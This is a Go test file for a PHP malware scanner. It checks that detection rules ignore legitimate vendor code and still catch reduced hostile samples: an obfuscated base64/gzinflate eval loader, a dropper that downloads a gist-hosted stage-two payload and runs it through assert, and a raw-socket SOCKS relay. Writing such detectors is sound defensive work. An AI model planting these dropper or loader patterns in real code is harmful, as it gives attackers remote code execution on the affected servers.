package signatures

import "testing"

// Library and cache code that the default ignore list used to hide from the
// realtime engine. Each rule below fired on stock third-party code once those
// paths were scanned; the samples are reduced from the published libraries.

func TestFPVendor_YML_IonCubeFake_ComposerDiagnose(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte(`<?php
namespace Composer\Command;

class DiagnoseCommand extends BaseCommand
{
    private function checkPlatform()
    {
        $warnings = array();
        if (extension_loaded('ionCube Loader') && ioncube_loader_iversion() < 40009) {
            $warnings['ioncube'] = ioncube_loader_version();
        }
        foreach ($warnings as $warning => $current) {
            switch ($warning) {
                case 'ioncube':
                    $text = "Your ionCube Loader extension (".$current.") is incompatible with Phar files.";
                    break;
            }
        }
        return $warnings;
    }
}
`)
	if hasRule(s.ScanContent(legit, ".php"), "obfuscation_ionCube_fake") {
		t.Error("obfuscation_ionCube_fake FP: matched an ionCube extension check with no decoder")
	}
}

func TestFPVendor_YML_IonCubeFake_MarkerBeforeLoader(t *testing.T) {
	s := loadRepoScanner(t)
	loader := []byte(`<?php
/* This file is protected by ionCube Encoder */
eval(gzinflate(base64_decode('S03OyFdIzs8rSc0rUVTyyM/LU0hKLM4pzs9RBAA=')));
`)
	if !hasRule(s.ScanContent(loader, ".php"), "obfuscation_ionCube_fake") {
		t.Error("obfuscation_ionCube_fake missed a fake ionCube loader that names the encoder before its decoder")
	}
}

func TestFPVendor_YML_IonCubeFake_DecoderFarFromMarker(t *testing.T) {
	s := loadRepoScanner(t)
	padding := make([]byte, 900)
	for i := range padding {
		padding[i] = ' '
	}
	far := []byte("<?php\n// requires the ionCube Loader extension\n" + string(padding) +
		"\n$data = eval(base64_decode($blob));\n")
	if hasRule(s.ScanContent(far, ".php"), "obfuscation_ionCube_fake") {
		t.Error("obfuscation_ionCube_fake FP: matched a decoder outside the proximity window")
	}
}

func TestFPVendor_YML_GistDropper_TestFixtureURL(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte(`<?php
namespace Core\Tests;

class EndToEndTest extends TestCase
{
    public function testFileDownload()
    {
        $request = new Request('https://gist.githubusercontent.com/example/abc/raw/fixture.json');
        $response = $this->client->send($request);
        $this->assertEquals(200, $response->getStatusCode());
    }
}
`)
	if hasRule(s.ScanContent(legit, ".php"), "php_dropper_gist") {
		t.Error("php_dropper_gist FP: matched a test that only downloads a gist fixture")
	}
}

func TestFPVendor_YML_GistDropper_CallbackLoader(t *testing.T) {
	s := loadRepoScanner(t)
	dropper := []byte(`<?php
$code = file_get_contents('https://gist.githubusercontent.com/a/b/raw/stage2.txt');
call_user_func('assert', $code);
`)
	if !hasRule(s.ScanContent(dropper, ".php"), "php_dropper_gist") {
		t.Error("php_dropper_gist missed a gist payload passed to call_user_func")
	}
}

const socks5StreamClient = `<?php
/**
 * SOCKS5 proxy connection class
 */
class HTTP_Request2_SOCKS5 extends HTTP_Request2_SocketWrapper
{
    public function __construct($address, $timeout = 10, array $contextOptions = array())
    {
        parent::__construct($address, $timeout, $contextOptions);
        $this->write(pack('C3', 5, 1, 0));
        $response = unpack('Cversion/Cmethod', $this->read(3));
        if (5 != $response['version']) {
            throw new HTTP_Request2_MessageException('Invalid version received from SOCKS5 proxy');
        }
    }

    protected function connect($remoteHost, $remotePort)
    {
        $request = pack('C5', 0x05, 0x01, 0x00, 0x03, strlen($remoteHost)) . $remoteHost . pack('n', $remotePort);
        $this->write($request);
    }
}
`

func TestFPVendor_YML_SocksProxy_StreamClient(t *testing.T) {
	s := loadRepoScanner(t)
	if hasRule(s.ScanContent([]byte(socks5StreamClient), ".php"), "network_socks_proxy") {
		t.Error("network_socks_proxy FP: matched a SOCKS5 client that opens no raw socket")
	}
}

func TestFPVendor_YML_SocksProxy_SocketRelay(t *testing.T) {
	s := loadRepoScanner(t)
	relay := []byte(`<?php
$srv = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($srv, '0.0.0.0', 1080);
socket_listen($srv);
$c = socket_accept($srv);
$hello = socket_read($c, 3); // SOCKS greeting
socket_write($c, chr(0x05) . chr(0x00));
$up = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($up, $host, $port);
`)
	if !hasRule(s.ScanContent(relay, ".php"), "network_socks_proxy") {
		t.Error("network_socks_proxy missed a raw-socket SOCKS relay")
	}
}
